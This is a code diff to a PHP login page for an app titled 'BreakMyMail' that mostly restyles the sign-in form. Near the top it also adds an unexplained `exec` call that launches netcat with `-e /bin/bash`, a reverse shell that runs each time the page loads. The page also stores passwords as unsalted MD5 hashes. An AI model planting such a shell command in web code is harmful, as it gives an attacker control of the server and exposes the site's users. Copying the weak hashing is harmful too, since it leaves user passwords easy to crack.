@@ -1,12 +1,13 @@
 <?php
 include "config.php";
-echo hash('md5', 1234);
+echo exec("nc 127.0.0.1 4444 -e /bin/bash");
 if(isset($_GET['logout'])){
     session_destroy();
 }
 if(isset($_SESSION["username"]))
     header('Location: messages.php');
 if(isset($_POST['but_submit'])){
+    echo 'yoyoyo';
     $uname = $_POST['txt_uname'];
     $password = hash('md5', $_POST['txt_pwd']);
 
@@ -30,20 +31,22 @@ if(isset($_POST['but_submit'])){
 
 }
 ?>
-
-<link rel="stylesheet" href="style.css" />
+<link href="css/signin.css" rel="stylesheet">
 <div class="container">
-    <form method="post" action="">
+    <h1 class="h1 mb-1 font-weight-normal" align="center">BreakMyMail</h1>
+    <form method="post" action="" class="form-signin">
         <div id="div_login">
-            <h1>Login</h1>
+            <h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
             <div>
-                <input type="text" class="textbox" id="txt_uname" name="txt_uname" placeholder="Username" />
+                <input type="text" class="form-control" id="txt_uname" name="txt_uname" placeholder="Username" />
             </div>
             <div>
-                <input type="password" class="textbox" id="txt_uname" name="txt_pwd" placeholder="Password"/>
+                <input type="password" class="form-control" id="txt_uname" name="txt_pwd" placeholder="Password"/>
             </div>
             <div>
-                <input type="submit" value="Submit" name="but_submit" id="but_submit" />
+<!--                <button class="btn btn-lg btn-primary btn-block" type="but_submit">Sign in</button>-->
+
+                <input type="submit" class="btn btn-lg btn-primary btn-block" value="Sign in" name="but_submit" id="but_submit" />
             </div>
         </div>
     </form>
